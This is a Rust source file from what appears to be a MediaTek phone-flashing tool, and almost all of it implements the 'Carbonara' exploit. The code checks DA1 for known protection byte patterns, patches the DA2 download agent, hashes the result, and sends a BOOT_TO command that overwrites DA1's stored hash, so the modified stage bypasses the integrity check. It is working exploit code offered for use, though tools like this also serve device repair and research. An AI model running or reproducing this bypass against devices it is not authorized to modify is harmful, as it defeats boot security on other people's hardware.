/*
    SPDX-License-Identifier: AGPL-3.0-or-later
    SPDX-FileCopyrightText: 2025 Shomy
*/
use std::sync::Arc;
use std::time::Duration;

use log::{debug, info};
use sha2::{Digest, Sha256};
use tokio::sync::Mutex;
use tokio::time::timeout;

use crate::connection::port::ConnectionType;
use crate::da::{DA, DAEntryRegion, DAProtocol};
use crate::error::{Error, Result};
use crate::exploit::{BootStage, Exploit, ExploitMeta};

pub struct Carbonara {
    meta: ExploitMeta,
    da: Arc<Mutex<DA>>,
    patched_da2: Option<DAEntryRegion>,
}

impl Carbonara {
    pub fn new(da: Arc<Mutex<DA>>) -> Self {
        Carbonara {
            meta: ExploitMeta {
                name: String::from("Carbonara"),
                boot_mode: vec![ConnectionType::Brom, ConnectionType::Preloader],
                boot_stage: BootStage::Da1,
            },
            da,
            patched_da2: None,
        }
    }

    async fn is_vulnerable(&self) -> bool {
        // These patterns were taken from mtkclient
        let tests: [&[u8]; 3] = [
            b"\x01\x01\x54\xE3\x01\x14\xA0\xE3",
            b"\x08\x00\xA8\x52\xFF\x02\x08\xEB",
            b"\x06\x9B\x4F\xF0\x80\x40\x02\xA9",
        ];
        let da = self.da.lock().await;
        if let Some(da1) = da.get_da1() {
            for pattern in tests.iter() {
                if da1.data.windows(pattern.len()).any(|w| w == *pattern) {
                    debug!("[Carbonara] Found protection pattern, device not vulnerable");
                    return false;
                }
            }
            debug!("[Carbonara] No protection patterns found, device potentially vulnerable");
            true
        } else {
            debug!("[Carbonara] No DA1 found, can't determine vulnerability");
            false
        }
    }

    pub fn get_patched_da2(&self) -> Option<&DAEntryRegion> {
        self.patched_da2.as_ref()
    }
}

#[async_trait::async_trait]
impl Exploit for Carbonara {
    async fn run(&mut self, protocol: &mut dyn DAProtocol) -> Result<bool> {
        if !self.is_vulnerable().await {
            return Err(Error::penumbra("Device is not vulnerable to Carbonara exploit"));
        }

        info!("[Exploit] Device is vulnerable to Carbonara! Cooking...");

        let da2 = {
            let da = self.da.lock().await;
            match da.get_da2() {
                Some(da2) => da2.clone(),
                None => return Err(Error::penumbra("DA2 region not found")),
            }
        };

        // Fallback
        self.patched_da2 = Some(da2.clone());

        let hash_offset = match self.da.lock().await.find_da_hash_offset() {
            Some(offset) => offset,
            None => return Err(Error::penumbra("Failed to find DA1 hash offset")),
        };
        debug!("[Exploit] Found DA1 hash offset at 0x{:X}", hash_offset);

        let da1_addr = {
            let da = self.da.lock().await;
            match da.get_da1() {
                Some(da1) => da1.addr,
                None => return Err(Error::penumbra("DA1 region not found")),
            }
        };

        // This emulates Ghidra behaviours (this is also required btw)
        // 0x2DEA4 -> 0x22DEA4
        let virtual_addr = hash_offset as u32 + da1_addr;

        if let Some(patched_da2) = protocol.patch_da2() {
            self.patched_da2 = Some(patched_da2);
        }

        let mut hasher = Sha256::new();
        if let Some(ref da2) = self.patched_da2 {
            hasher.update(&da2.data);
        }

        let hash_result = hasher.finalize();
        debug!("[Exploit] Computed DA2 SHA256 hash: {:x}", hash_result);

        match timeout(
            Duration::from_secs(5),
            protocol.boot_to(virtual_addr, hash_result.as_slice()),
        )
        .await
        {
            Ok(_) => debug!("[Exploit] Sent Carbonara DA2 hash"),
            Err(e) => {
                return Err(Error::penumbra(format!("Failed to send BOOT_TO command: {}", e)));
            }
        }

        info!("[Exploit] Carbonara got served! Enjoy your meal ;)");

        Ok(true)
    }

    fn get_meta(&self) -> &ExploitMeta {
        &self.meta
    }
}
